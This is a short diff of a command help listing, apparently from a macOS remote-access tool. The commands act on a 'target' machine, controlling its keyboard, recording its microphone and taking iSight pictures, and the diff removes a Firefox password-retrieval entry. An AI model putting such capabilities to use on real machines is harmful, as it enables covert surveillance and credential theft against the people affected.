@@ -126,9 +126,8 @@
     icons          : List system alert icons.
     idletime       : Get the amount of time since the keyboard/cursor were touched.
     imessage       : Send message through the messages app.
-    itunes         : iTunes Controller.
-    keyboard       : Your keyboard -> is target's keyboard.
-    lazagne        : Firefox password retrieval.
+    itunes         : Control iTunes player.
+    keyboard       : Control target's keyboard.
     ls             : List contents of a directory.
     mic            : Record mic sound.
     picture        : Take picture through iSight.
